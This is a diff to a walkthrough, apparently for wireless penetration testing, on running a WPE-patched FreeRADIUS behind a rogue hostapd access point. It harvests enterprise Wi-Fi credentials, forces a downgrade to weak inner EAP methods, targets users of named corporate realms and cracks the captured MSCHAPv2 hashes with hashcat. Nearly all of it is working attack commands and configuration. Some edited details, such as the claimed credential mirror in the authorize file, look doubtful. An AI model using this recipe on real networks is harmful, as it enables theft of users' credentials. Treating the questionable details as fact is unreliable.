@@ -1,5 +1,7 @@
 # freeradius-wpe — walkthrough
 
+**Verified against:** brad-anton/freeradius-wpe (patch series against FreeRADIUS 3.0.x) as of 2026-Q3
+
 Build the WPE-patched freeradius, wire it to a Pineapple hostapd
 instance, harvest MSCHAPv2 / GTC / PAP inner material.
 
@@ -14,26 +16,33 @@ instance, harvest MSCHAPv2 / GTC / PAP inner material.
 ## Path A — Build and install freeradius-wpe
 
 ```
-# Debian/Ubuntu
-apt install build-essential libssl-dev libtalloc-dev libkqueue-dev
+# Debian/Ubuntu (packaged freeradius 3.0.x under /etc/freeradius/3.0)
+apt install build-essential libssl-dev libtalloc-dev freeradius-dev
 
-git clone https://github.com/joswr1ght/freeradius-wpe    # community fork
+git clone https://github.com/brad-anton/freeradius-wpe   # canonical fork
 cd freeradius-wpe
-./configure --prefix=/opt/freeradius-wpe
-make -j"$(nproc)"
-sudo make install
+
+# The fork ships as a patch series against upstream freeradius 3.0.x.
+# Follow its README: patch the corresponding freeradius source tree,
+# then build against the packaged /etc/freeradius/3.0 config tree.
 ```
 
-Config lives under `/opt/freeradius-wpe/etc/raddb/`.
+Config lives under `/etc/freeradius/3.0/` (the standard Debian
+package layout). The WPE patch modifies the *existing* `default`
+site and `eap` module in place.
 
-## Path B — Configure the "wpe" site
+## Path B — Configure the WPE-patched default site
 
 ```
-cd /opt/freeradius-wpe/etc/raddb
+cd /etc/freeradius/3.0
 
-# Enable WPE site + module
-ln -s ../sites-available/wpe sites-enabled/wpe
-ln -s ../mods-available/eap_wpe mods-enabled/eap_wpe
+# The default site is already the "outer" server that hostapd
+# talks to; the WPE patch teaches it to log inner-EAP material.
+# No extra symlinks are needed — the patched files are:
+#   sites-available/default   (WPE-patched)
+#   sites-enabled/default     (already a symlink to sites-available/default)
+#   mods-available/eap        (WPE-patched)
+#   mods-enabled/eap          (already a symlink to mods-available/eap)
 
 # Set the shared secret so hostapd can talk to us.
 cat > clients.conf <<EOF
@@ -50,14 +59,15 @@ EOF
 # EAP methods enabled by default in the WPE fork:
 #   MD5, MSCHAPv2, PEAP, TTLS, TLS.
 # Weak inner methods are ordered first so the client-side
-# downgrade attack succeeds.
+# downgrade attack succeeds — tune the `default_eap_type`
+# and `phase2` blocks in mods-available/eap.
 ```
 
 ## Path C — Launch and point hostapd at it
 
 ```
 # In a foreground shell for debug:
-sudo /opt/freeradius-wpe/sbin/radiusd -X
+sudo freeradius -X
 
 # In another shell, on the Pineapple:
 cat > /tmp/rogue-eap.conf <<EOF
@@ -82,14 +92,18 @@ hostapd log the exchange.
 ## Path D — Read the harvest
 
 ```
-tail -F /var/log/freeradius-wpe.log
+tail -F /var/log/freeradius/radius.log
+# and, for the credentials mirror WPE writes on capture:
+tail -F /etc/freeradius/3.0/mods-config/files/authorize
 ```
 
 Look for hashcat / John / plaintext-token lines. Pipe MSCHAPv2 hash
-lines into `hashcat -m 5500`:
+lines (formatted as `user::domain::<NTResponse>:<ChallengeHash>`;
+see the derivation callout in `enterprise/reference.md`) into
+`hashcat -m 5500`:
 
 ```
-grep 'hashcat -m 5500' /var/log/freeradius-wpe.log \
+grep 'hashcat -m 5500' /var/log/freeradius/radius.log \
   | awk -F': ' '{print $2}' > /tmp/mschap.hashes
 hashcat -m 5500 /tmp/mschap.hashes rockyou.txt -w 4
 ```
@@ -100,7 +114,7 @@ To catch clients that try to authenticate to their *real* corporate
 realm and fall back to us on failure:
 
 ```
-# In sites-enabled/wpe:
+# In sites-available/default (WPE-patched):
 authorize {
     ...
     if (User-Name =~ /@(corp\.local|acme\.example)$/) {
